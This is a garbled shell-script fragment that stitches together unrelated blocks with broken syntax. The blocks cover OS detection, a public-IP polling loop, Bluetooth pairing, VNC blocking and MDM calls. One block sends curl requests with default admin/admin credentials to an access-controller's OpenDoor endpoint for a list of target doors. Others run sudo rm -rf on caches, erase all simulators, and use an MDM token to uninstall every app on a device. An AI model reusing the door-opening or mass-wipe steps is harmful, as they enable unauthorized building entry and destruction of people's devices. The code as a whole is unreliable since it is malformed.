                                                 mkdir -p "$LOCAL_DOWNLOAD_DIR"

  

                                                 # Copy backup file from remote to local

                                                 # scp "${REMOTE_USER}@${REMOTE_HOST}:${REMOTE_BACKUP_PATH}" "$LOCAL_DOWNLOAD_DIR/"

  

                                                 # Extract the downloaded backup file

                                                 cd "$LOCAL_DOWNLOAD_DIR" || exit

  

                                                 # Detect file type and extract accordingly

                                                 FILENAME=(basename "$REMOTE_BACKUP_PATH")

  

                                                 if [[ "$FILENAME" == *.tar.gz ]] || [[ "$FILENAME" == *.tgz ]]; then

                                                     tar -xzvf "$FILENAME"

                                                 elif [[ "$FILENAME" == *.zip ]]; then

                                                     unzip "$FILENAME"

                                                 elif [[ "$FILENAME" == *.tar.bz2 ]]; then

                                                     tar -xjvf "$FILENAME"

                                                 else

                                                     echo "Unsupported archive format: $FILENAME"

                                                     exit 1

                                                 fi

                                             }

                                             &

  

  

                                             usboverIPshell=(

                                             *usbover* &

                                             # Stop VNC and block on usb0

                                             sudo systemctl stop vncserver-x11-serviced &

                                             sudo iptables -A INPUT -i usb0 -p tcp --dport 5900 -j DROP &  # Block VNC port 5900 on usb0

                                             sudo iptables-save > /etc/iptables/rules.v4 &  # Persist rules (install iptables-persistent if needed)

                                             exit 0 &

                                             }

  

  

                                             ############# OSLEVEL #################

  

                                             detectOS() {

                                                 local os="$1"

                                                 local script="$2"

  

                                                 # macOS check (Darwin kernel)

                                                 if [ "$(uname -s)" = "Darwin" ]; then

                                                     if command -v sw_vers >/dev/null 2>&1; then

                                                         PRODUCT=(sw_vers -productName)

                                                         VERSION=(sw_vers -productVersion)

  

                                                         if [[ "$PRODUCT" == *"iPhone"* || "$PRODUCT" == *"iPad"* ]]; then

                                                             os="iOS_iPadOS"

                                                             echo "Detected: $os $VERSION ($(sw_vers -productName))"

                                                     $script & exit 0 &

                                                         elif [[ "$PRODUCT" == *"watch"* ]]; then

                                                             os="watchOS"

                                                             echo "Detected: $os $VERSION"

                                                     $script & exit 0 &

                                                         else

                                                             os="macOS"

                                                             echo "Detected: $os $VERSION"

                                                     $script & exit 0 &

                                                         fi

                                                     fi

  

                                                 # Linux check

                                                 elif [ "$(uname -s)" = "Linux" ]; then

                                                     if [ -f /etc/os-release ]; then

                                                         source /etc/os-release

                                                         os="$ID ($PRETTY_NAME)"

                                                     else

                                                         os="Linux"

                                                     $script & exit 0 &

                                                     fi

                                                     echo "Detected: $os"

  

                                                     # Android specific (Termux/embedded)

                                                     if [ -d /system/app ] || [ -f /proc/version ] && grep -qi android /proc/version; then

                                                         os="Android"

                                                         echo "Detected: $os ($(getprop ro.build.version.release 2>/dev/null || echo "unknown"))"

                                                     $script & exit 0 &

                                                     fi

  

                                                 else

                                                     os="Unknown"

                                                     echo "Detected: $os ($(uname -a))"

                                                 fi

  

                                                 exit 0 &

                                             }

  

  

                                             ####### RF modules #########

  

  

  

  

  

  

  

  

                                             ########## WDS & NETWORK & CELLULAR #########

  

                                             satelliteModules=(

  

                                             ####### GET SAT IP ########

  

                                             # Monitoring interval in seconds

                                             INTERVAL=30

  

                                             # Store latest IP here

                                             #LOGFILE="$HOME/public_ip.log"

                                             #TMPFILE="/tmp/cur_ip.txt"

  

                                             # Third‑party IP‑lookup service (choose one)

                                             # Available inside Blink as long as network is on

                                             API_URL="https://ifconfig.me"     # lightweight, common choice

                                             # API_URL="https://api.ipify.org"  # alternative

  

                                             while true; do

                                               # Get current public IP; timeout prevents hanging

                                               if curl -fsS --max-time 10 "$API_URL" > "$TMPFILE" 2>/dev/null; then

                                                 SAT_IP=(cat "$TMPFILE" | tr -d '[:space:]')

                                               else

                                                 SAT_IP="UNKNOWN"

                                               fi

  

                                               DATE_STR=(date "+%Y-%m-%d %H:%M:%S")

  

                                               SAT_IP

                                               sleep "$INTERVAL"

                                             done

  

                                             exit 0 &

  

                                             }

  

  

  

  

  

  

                                             ######## samsung knox ###### 

                                             knoxbuilding=(

                                             targetdoor=$1 &

                                                 doornumber=(1222 1223 13...10* -10*...1*)

                                                 ROOMTARGET=doornumber 

                                             KNOX_IP="192.168.1.100"

                                             USERNAME="admin"

                                             PASSWORD="admin"

                                             curl -sS -X GET "http://${KNOX_IP}/fcgi/OpenDoor?action=OpenDoor&DoorNum=$doornumber&UserName=${USERNAME}&Password=${PASSWORD}"

                                             &

  

                                             lldbFrame "$getRouter* $ROOMTARGET $QQLOCAL" "QQAPP & alarm* & reckonapp & knoxbuilding & exit 0 &" "$gen*" &

  

                                             }

  

  

  

  

  

  

  

  

                                             clearCacheIOS=(

                                             USER=`stat -f%Su /dev/console`

                                             sudo /bin/rm -rf /Library/Caches/* > /dev/null 2>&1

                                             sudo /bin/rm -rf /Users/$USER/Library/Caches/* > /dev/null 2>&1

  

  

                                             }

  

  

  

  

                                             connectQQBLE=(

                                             IPHONE_BT_ID="$QQDEVICESER"

  

                                             #"1:-AA-BB-CC-DD-EE-FF}"

  

                                             if ! command -v blueutil >/dev/null 2>&1; then

                                               echo "blueutil not found. Install it with: brew install blueutil"

                                               exit 1

                                             fi

  

                                             blueutil --power 1 &

  

                                             if [ "$(blueutil --is-connected "$IPHONE_BT_ID" 2>/dev/null || echo 0)" = "1" ]; then

                                               echo "iPhone already connected: $IPHONE_BT_ID"

                                               exit 0

                                             fi

  

  

                                             blueutil --connect "$IPHONE_BT_ID"

  

                                             sleep 1

  

                                             if [ "$(blueutil --is-connected "$IPHONE_BT_ID" 2>/dev/null || echo 0)" = "1" ]; then

                                               echo "Connected successfully."

                                             else

                                               echo "Connection attempt finished, but device is not reported as connected."

                                               exit 2

                                             fi

  

  

  

                                             arcOSUIDetection=(

  

                                             STATE_DIR="${HOME}/.arcosnx-cursor"

                                             STATE_FILE="${STATE_DIR}/last_state"

                                             mkdir -p "$STATE_DIR"

  

                                             NEW_STATE="${1:-unknown}"

                                             LAST_STATE="$(cat "$STATE_FILE" 2>/dev/null || true)"

  

                                             declare -A CURSOR_DICT=(

                                             [arrow]="default pointer"

                                             [iBeam]="text insertion"

                                             [crosshair]="precision select"

                                             [closedHand]="dragging active"

                                             [openHand]="grab available"

                                             [pointingHand]="link/action hover"

                                             [resizeLeft]="resize west"

                                             [resizeRight]="resize east"

                                             [resizeLeftRight]="resize east-west"

                                             [resizeUp]="resize north"

                                             [resizeDown]="resize south"

                                             [resizeUpDown]="resize north-south"

                                             [disappearingItem]="delete/remove animation"

                                             [iBeamCursorForVerticalLayout]="vertical text"

                                             [operationNotAllowed]="forbidden"

                                             [dragLink]="drag creates link"

                                             [dragCopy]="drag copies"

                                             [contextualMenu]="context menu"

                                             [unknown]="unmapped"

                                             )

  

                                             if [[ "$NEW_STATE" != "$LAST_STATE" ]]; then

                                             printf '%s\n' "$NEW_STATE" > "$STATE_FILE"

                                             /usr/local/bin/arcOSnx "$NEW_STATE" "${CURSOR_DICT[$NEW_STATE]:-unmapped}"

                                             arcOSBaseKit & arcOSnx &

                                             fi

                                              & #mobile config BaseQQLAND > #bundle BUNDLE_ID="${1:?Usage: $0 com.example.app}" xcrun simctl uninstall booted "$BUNDLE_ID" || true & xcrun simctl erase all & MDM_API_BASE="$APPLEMDM" & DEVICE_ID="$FULL_IOS_SERIAL" & APP_ID="*" & MDM_API_BASE="${MDM_API_BASE:?Set MDM_API_BASE}" #MDM_TOKEN="${MDM_TOKEN:?Set MDM_TOKEN}" & DEVICE_ID="${1:?Usage: $0 DEVICE_ID APP_ID}" & APP_ID="${2:?Usage: $0 DEVICE_ID APP_ID}" & # 1. Remove managed app configuration & curl -sS -X DELETE \ -H "Authorization: Bearer $MDM_TOKEN" \ -H "Accept: application/json" \ "${MDM_API_BASE}/devices/${DEVICE_ID}/apps/${APP_ID}/managed-config" || true & # 2. Uninstall the app & curl -sS -X POST \ -H "Authorization: Bearer $MDM_TOKEN" \ -H "Accept: application/json" \ "${MDM_API_BASE}/devices/${DEVICE_ID}/apps/${APP_ID}/uninstall" || true /

                                                                                          )
```